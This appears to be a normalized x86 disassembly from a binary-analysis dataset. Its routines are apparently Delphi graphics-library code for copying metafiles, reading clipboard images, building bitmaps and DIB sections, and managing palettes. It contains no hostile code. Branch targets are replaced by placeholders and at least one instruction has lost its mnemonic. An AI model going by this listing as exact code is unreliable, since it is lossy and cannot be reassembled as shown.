pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_427bac
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_427594
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_428314
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_428310
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_427c30
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41c264
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_427d3c
mov edx ebx
mov eax esi
call sub_427cb0
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_427cb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027c4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427d2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41c4c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4027e4
retn
sub_427d3c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402c68
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41c4c8
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41c4c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427e5e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4027e4
retn
call sub_4248e8
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_40651c
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_40651c
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_4256d8
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_427e77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4027c4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427e57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_427e84
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_427594
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_424858
sub_427f08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_427ff4
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41a978
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428092
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428099
mov eax [ rw-data ]
call sub_41a9dc
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42806a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_428184
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_42446c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a5d0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_424410
test al al
je r-xdata
sub_4280a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a978
mov esi eax
xor ecx ecx
push ebp
push sub_428110
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a9dc
retn
mov edx ebx
mov eax esi
call sub_41a5d0
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_428184
sub_42811c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_423de4
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_428158
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_428184
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423ea8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_428184
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424164
xor edx edx
push ebp
push sub_428218
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424618
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41a98c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42446c
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_428224
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424164
xor eax eax
push ebp
push sub_428303
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_429540
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4280a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_429640
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424618
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41a8f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42446c
retn
sub_428314
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403254
sub_428334
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4280a0
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d788
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_428390
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_422718
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4280a0
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4280a0
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_4283dc
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_425124
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42848b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_428498
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_4284e4
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4280a0
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_424990
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424990
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_428b32
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4027c4
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_42883c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_424870
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_424990
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_424990
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_424990
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_424990
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_428ae3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_428ad2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_428ab0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_424990
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_428498
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4029c0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_425124
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423cc8
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_41919c
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_422fe8
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423c8c
call sub_422fe8
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4248e8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428ab7
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424990
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_428a86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424990
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4027e4
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_422fe8
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423c8c
call sub_422fe8
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_422fe8
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423c8c
call sub_422fe8
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424990
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403a8c
call sub_403a8c
jmp r-xdata
sub_428ad9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_428ae8
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a08
call sub_403a5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_428b48
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_428bac
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4280a0
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_428da7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_424990
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424990
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
